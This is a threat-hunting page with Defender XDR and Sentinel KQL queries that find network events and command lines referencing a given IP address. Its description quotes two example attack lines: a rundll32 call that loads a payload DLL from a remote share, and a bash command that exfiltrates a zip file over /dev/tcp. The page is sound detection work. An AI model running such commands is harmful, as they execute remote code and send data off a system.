# IP Lookup (Network & Commandline)

## Query Information

#### Description
This query can be used to perform a IP lookup on both the DeviceNetworkEvents as well as the commandline references. This can help in incident investigations to quickly find all the related logs and commandline references of the IP address. The *LookupIP* is used to set a IP on which you want to look for. This can eiter be a public or private address. Both ipv4 and ipv6 are supported The query has also a setting that you can change to only show commandline results, thent he line *| where CommandLineReference == true* needs to be uncommented. 

Two examples below are stated, which will be shown based on the commandline lookup. Remote downloads or executions of files can be an indicator of malicious activity.
```
rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
```

#### References
- https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
- https://lolbas-project.github.io/lolbas/Binaries/Bash/
## Defender XDR
```
// Set the IP address you are trying to lookup.
let LookupIP = "127.0.0.1";
let SearchWindow = 48h; //Customizable h = hours, d = days
// Collect all network evets to the RemoteIP
let NewtworkEvents = DeviceNetworkEvents
     | where Timestamp > ago(SearchWindow)
     | where RemoteIP == LookupIP
     | project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessAccountSid;
// Collect all commandline references of the IP
let CommandLineReferences = DeviceProcessEvents
     | where Timestamp > ago(SearchWindow)
     | where ProcessCommandLine contains LookupIP
     | project Timestamp, DeviceName, ActionType, FolderPath, ProcessCommandLine, AccountSid;
// Combine results
(union isfuzzy=true
     (NewtworkEvents),
     (CommandLineReferences)
     // If you do want to have raw logs remove the summarize below.
     // CommandLines and RemoteURLs can both be empty if there is no Commandline reference and a connection is only made to a IP not to a URL.
     | summarize RemoteURLs = make_set(RemoteUrl), CommandLines = make_set(ProcessCommandLine), LastMention = arg_max(Timestamp, *) by DeviceName
     // Add filter posibility to alter the search results if you only want to see commandline references. By default it includes both network and commandline references. If you only want to see commandline references uncommment the statment CommandLineReference == true
     | extend CommandLineReference = iff(CommandLines == @'[""]', false, true)
     //| where CommandLineReference == true
     | project-reorder LastMention, DeviceName, RemoteIP
     | sort by LastMention
)
```
## Sentinel
```
// Set the IP address you are trying to lookup.
let LookupIP = "127.0.0.1";
let SearchWindow = 48h; //Customizable h = hours, d = days
// Collect all network evets to the RemoteIP
let NewtworkEvents = DeviceNetworkEvents
     | where TimeGenerated > ago(SearchWindow)
     | where RemoteIP == LookupIP
     | project TimeGenerated, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessAccountSid;
// Collect all commandline references of the IP
let CommandLineReferences = DeviceProcessEvents
     | where TimeGenerated > ago(SearchWindow)
     | where ProcessCommandLine contains LookupIP
     | project TimeGenerated, DeviceName, ActionType, FolderPath, ProcessCommandLine, AccountSid;
// Combine results
(union isfuzzy=true
     (NewtworkEvents),
     (CommandLineReferences)
     // If you do want to have raw logs remove the summarize below.
     // CommandLines and RemoteURLs can both be empty if there is no Commandline reference and a connection is only made to a IP not to a URL.
     | summarize RemoteURLs = make_set(RemoteUrl), CommandLines = make_set(ProcessCommandLine), LastMention = arg_max(TimeGenerated, *) by DeviceName
     // Add filter posibility to alter the search results if you only want to see commandline references. By default it includes both network and commandline references. If you only want to see commandline references uncommment the statment CommandLineReference == true
     | extend CommandLineReference = iff(CommandLines == @'[""]', false, true)
     //| where CommandLineReference == true
     | project-reorder LastMention, DeviceName, RemoteIP
     | sort by LastMention
)
```
